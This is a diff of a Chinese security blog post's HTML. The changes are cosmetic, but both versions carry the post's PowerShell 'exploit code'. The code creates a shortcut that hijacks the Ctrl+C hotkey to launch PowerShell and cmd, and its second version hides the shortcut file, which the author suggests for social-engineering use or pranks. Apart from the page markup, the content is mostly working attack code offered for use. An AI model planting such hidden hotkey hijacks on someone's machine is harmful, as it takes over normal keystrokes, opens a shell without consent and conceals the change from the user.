@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="# PowerShell劫持Windows快捷键利用代码：1234567$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&amp;quot;C:\Users\x\Desktop\1.lnk&amp;quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。$Shortcut.Targ">
+<meta name="description" content="PowerShell劫持Windows快捷键利用代码：1234567$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&amp;quot;C:\Users\x\Desktop\1.lnk&amp;quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。$Shortcut.TargetP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PowerShell劫持Windows快捷键">
 <meta property="og:url" content="https://thtboom.github.io/2019/03/02/PowerShell劫持Windows快捷键/index.html">
 <meta property="og:site_name" content="T&#39;Sec">
-<meta property="og:description" content="# PowerShell劫持Windows快捷键利用代码：1234567$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&amp;quot;C:\Users\x\Desktop\1.lnk&amp;quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。$Shortcut.Targ">
+<meta property="og:description" content="PowerShell劫持Windows快捷键利用代码：1234567$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&amp;quot;C:\Users\x\Desktop\1.lnk&amp;quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。$Shortcut.TargetP">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-02T13:17:18.798Z">
+<meta property="og:updated_time" content="2019-03-02T13:19:49.006Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PowerShell劫持Windows快捷键">
-<meta name="twitter:description" content="# PowerShell劫持Windows快捷键利用代码：1234567$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&amp;quot;C:\Users\x\Desktop\1.lnk&amp;quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。$Shortcut.Targ">
+<meta name="twitter:description" content="PowerShell劫持Windows快捷键利用代码：1234567$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut(&amp;quot;C:\Users\x\Desktop\1.lnk&amp;quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。$Shortcut.TargetP">
 
 
 
@@ -299,8 +299,7 @@
       
 
       
-        <p> #</p>
-<h2 id="PowerShell劫持Windows快捷键"><a href="#PowerShell劫持Windows快捷键" class="headerlink" title="PowerShell劫持Windows快捷键"></a>PowerShell劫持Windows快捷键</h2><p><strong>利用代码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$WshShell = New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut = $WshShell.CreateShortcut(&quot;C:\Users\x\Desktop\1.lnk&quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。</span><br><span class="line">$Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;</span><br><span class="line">$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.hotkey = &quot;ctrl+c&quot;</span><br><span class="line">$Shortcut.Arguments = &apos;cmd&apos;</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure></p>
+        <h2 id="PowerShell劫持Windows快捷键"><a href="#PowerShell劫持Windows快捷键" class="headerlink" title="PowerShell劫持Windows快捷键"></a>PowerShell劫持Windows快捷键</h2><p><strong>利用代码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$WshShell = New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut = $WshShell.CreateShortcut(&quot;C:\Users\x\Desktop\1.lnk&quot;) \\存放快捷方式的路径，这种方式的路径需设置在桌面下。</span><br><span class="line">$Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;</span><br><span class="line">$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.hotkey = &quot;ctrl+c&quot;</span><br><span class="line">$Shortcut.Arguments = &apos;cmd&apos;</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure></p>
 <p>代码可实现劫持Windows的快捷键，按下ctrl+c会出现cmd界面。</p>
 <p>但是这种设置在桌面下太显眼，如果是做一些类似社工的操作或者恶作剧，就必须隐藏这个快捷方式。</p>
 <p><strong>利用代码2.0：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$WshShell = New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut = $WshShell.CreateShortcut(&quot;C:\Users\x\Desktop\1.lnk&quot;)</span><br><span class="line">$Shortcut.TargetPath = &quot;%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;</span><br><span class="line">$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.hotkey = &quot;ctrl+c&quot;</span><br><span class="line">$Shortcut.Arguments = &apos;cmd&apos;</span><br><span class="line">$Shortcut.Save()</span><br><span class="line">$file = Get-Item C:\Users\x\Desktop\1.lnk</span><br><span class="line">$file.Attributes=&quot;hidden&quot;</span><br></pre></td></tr></table></figure></p>
